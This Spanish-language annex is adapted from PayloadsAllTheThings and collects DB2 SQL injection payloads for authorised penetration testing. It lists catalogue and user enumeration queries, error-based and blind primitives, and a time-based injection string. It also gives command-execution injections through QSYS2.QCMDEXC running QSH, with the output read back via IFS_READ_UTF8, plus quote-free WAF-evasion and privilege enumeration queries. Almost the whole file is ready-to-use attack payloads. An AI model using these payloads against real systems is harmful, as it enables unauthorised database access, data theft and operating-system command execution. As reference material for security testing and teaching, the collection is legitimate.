# SQL injection: anexo de ejemplos de PayloadsAllTheThings

> **Uso:** elegir el bloque que corresponde al motor, versión y punto de entrada. Las líneas de un bloque pueden ser alternativas. Sustituir hosts, rutas, identificadores y dominios por los del laboratorio o alcance autorizado. Los ejemplos originales son referencias de sintaxis, no pruebas verificadas contra el objetivo.

**Documento de origen:** [SQL Injection/DB2 Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a/SQL%20Injection/DB2%20Injection.md), revisión fija 3ac27901c711. **Licencia:** [MIT de Swissky](../../LICENCIA_PATT.md).

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md)

## 1. DB2 Inyección / DB2 Comentarios

### Variantes presentes en tablas o texto del apartado

```text
--
```

## 2. DB2 Inyección / DB2 Enumeration

### Variantes presentes en tablas o texto del apartado

```text
select versionnumber, version_timestamp from sysibm.sysversions;
select service_level from table(sysproc.env_get_inst_info()) as instanceinfo
select getvariable('sysibm.version') from sysibm.sysdummy1
select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo
select service_level,bld_level from sysibmadm.env_inst_info
select user from sysibm.sysdummy1
select session_user from sysibm.sysdummy1
select system_user from sysibm.sysdummy1
select current server from sysibm.sysdummy1
select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info
```

## 3. DB2 Inyección / DB2 Metodología

### Variantes presentes en tablas o texto del apartado

```text
SELECT distinct(table_catalog) FROM sysibm.tables
SELECT schemaname FROM syscat.schemata;
SELECT name, tbname, coltype FROM sysibm.syscolumns
SELECT table_name FROM sysibm.tables
SELECT name FROM sysibm.systables
SELECT tbname FROM sysibm.syscolumns WHERE name='username'
```

## 4. DB2 Inyección / DB2 Basada en errores

```sql
-- Returns all in one xml-formatted string
select xmlagg(xmlrow(table_schema)) from sysibm.tables

-- Same but without repeated elements
select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables)

-- Returns all in one xml-formatted string.
-- May need CAST(xml2clob(… AS varchar(500)) to display the result.
select xml2clob(xmelement(name t, table_schema)) from sysibm.tables 
```

## 5. DB2 Inyección / DB2 Ciega Based

### Variantes presentes en tablas o texto del apartado

```text
select substr('abc',2,1) FROM sysibm.sysdummy1
select chr(65) from sysibm.sysdummy1
select ascii('A') from sysibm.sysdummy1
select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only
select bitand(1,0) from sysibm.sysdummy1
select bitandnot(1,0) from sysibm.sysdummy1
select bitor(1,0) from sysibm.sysdummy1
select bitxor(1,0) from sysibm.sysdummy1
select bitnot(1,0) from sysibm.sysdummy1
```

## 6. DB2 Inyección / DB2 Basada en tiempo

```sql
' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)>0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 
```

## 7. DB2 Inyección / DB2 Ejecución de comandos

```sql
'||QCMDEXC('QSH CMD(''system dspusrprf PROFILE'')')
```

```sql
QSYS2.QCMDEXC('QSH CMD(''system dspusrprf PROFILE > /tmp/qsh_output.txt 2>&1'')')
SELECT LINE FROM TABLE(QSYS2.IFS_READ_UTF8('/tmp/qsh_output.txt',2147483647,'NONE'))
```

### Variantes presentes en tablas o texto del apartado

```text
QSYS2.QCMDEXC()
/tmp/qsh_output.txt
QSYS2.IFS_READ_UTF8
```

## 8. DB2 Evasión de WAF / Avoiding Quotes

```sql
SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1
```

## 9. DB2 Inyección / DB2 Accounts and Privileges

### Variantes presentes en tablas o texto del apartado

```text
select distinct(grantee) from sysibm.systabauth
select distinct(definer) from syscat.schemata
select distinct(authid) from sysibmadm.privileges
select grantee from syscat.dbauth
select * from syscat.tabauth
select * from SYSIBM.SYSUSERAUTH — List db2 system privilegies
select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y'
select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = 'Y' or SYSADMAUTH = 'G'
select * from sysibmadm.reg_variables where reg_var_name='DB2PATH'
```

---

[← Índice de anexos](Catalogo_PATT.md) · [← Guía principal](README.md) · [Licencia de origen](../../LICENCIA_PATT.md)
